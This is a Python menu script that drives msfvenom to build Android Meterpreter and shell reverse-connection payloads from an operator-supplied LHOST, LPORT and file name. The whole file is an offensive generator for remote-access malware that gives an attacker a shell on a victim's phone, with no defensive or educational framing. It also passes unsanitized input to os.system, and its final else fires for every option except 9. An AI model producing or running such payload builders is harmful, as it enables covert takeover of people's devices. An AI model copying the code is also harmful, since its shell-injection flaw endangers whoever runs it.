from colorama import Fore
import os

os.system('clear')

def andr():
    print( 
    f"""{Fore.CYAN}
    Choose a payload:
    {Fore.GREEN}
        1- payload/android/meterpreter/reverse_http
        2- payload/android/meterpreter/reverse_https
        3- payload/android/meterpreter/reverse_tcp
        4- payload/android/meterpreter_reverse_http
        5- payload/android/meterpreter_reverse_https
        6- payload/android/meterpreter_reverse_tcp
        7- payload/android/shell/reverse_http
        8- payload/android/shell/reverse_https
        9- payload/android/shell/reverse_tcp

    """)
    
    payload = input(Fore.GREEN + "Payload-Empire:~# ")

    if payload == '1':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/android/meterpreter/reverse_http LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '2':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/android/meterpreter/reverse_https LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '3':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '4':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/android/meterpreter_reverse_http LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '5':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/android/meterpreter_reverse_https LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '6':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/android/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '7':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/android/shell/reverse_http LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '8':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/android/shell/reverse_https LHOST={lhost} LPORT={lport} -o {name}")

    if payload == '9':
        lhost = input(Fore.CYAN + "[+] Enter LHOST: ")
        lport = input("[+] Enter LPORT: ")
        name = input("[+] Enter payload name: ")

        os.system(f"msfvenom -p payload/android/shell/reverse_tcp LHOST={lhost} LPORT={lport} -o {name}")

    else:
        print(Fore.RED + "[!]ERROR")